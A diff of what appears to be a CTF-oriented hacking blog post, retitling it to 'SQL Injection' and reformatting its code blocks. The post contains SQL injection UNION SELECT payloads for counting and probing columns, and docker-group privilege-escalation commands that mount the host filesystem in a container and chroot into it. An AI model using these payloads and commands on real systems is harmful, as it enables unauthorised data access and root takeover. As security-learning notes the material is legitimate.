@@ -1,5 +1,5 @@
 ---
-title:  Stealing all the Cookies...
+title:  SQL Injection,
 categories:
   - blog
 tags:
@@ -22,14 +22,30 @@ I quess this is a Enumeration methoth anyone can remember :)
 
 <p>
 <code>' UNION SELECT NULL--</code>
-<code>' UNION SELECT NULL,NULL--</code>
-<code>' UNION SELECT NULL,NULL,NULL--</code>
 </p>
 
 <p>
+<code>' UNION SELECT NULL,NULL--</code>
+</p>
+
+<p>
+<code>' UNION SELECT NULL,NULL,NULL--</code>
+</p>
+
+
+<p>
 <code>' UNION SELECT 'a',NULL,NULL,NULL--</code>
+</p>
+
+<p>
 <code>' UNION SELECT NULL,'a',NULL,NULL--</code>
+</p>
+
+<p>
 <code>' UNION SELECT NULL,NULL,'a',NULL--</code>
+</p>
+
+<p>
 <code>' UNION SELECT NULL,NULL,NULL,'a'--</code>
 </p>
 
@@ -54,7 +70,13 @@ Basically if you are in the docker group, you can do the following:
 
 <p>
 <code>#Search the socket</code>
+</p>
+
+<p>
 <code>find / -name docker.sock 2&gt;/dev/null</code>
+</p>
+
+<p>
 <code>#It's usually in /run/docker.sock</code>
 </p>
 
@@ -65,7 +87,16 @@ Although not that realistic I guess, but good for CTFs
 
 <p>
 <code>#List images to use one</code>
+</p>
+
+<p>
 <code>docker images</code>
+</p>
+
+<p>
 <code>#Run the image mounting the host disk and chroot on it</code>
+</p>
+
+<p>
 <code>docker run -it -v /:/host/ ubuntu:18.04 chroot /host</code>
 </p>
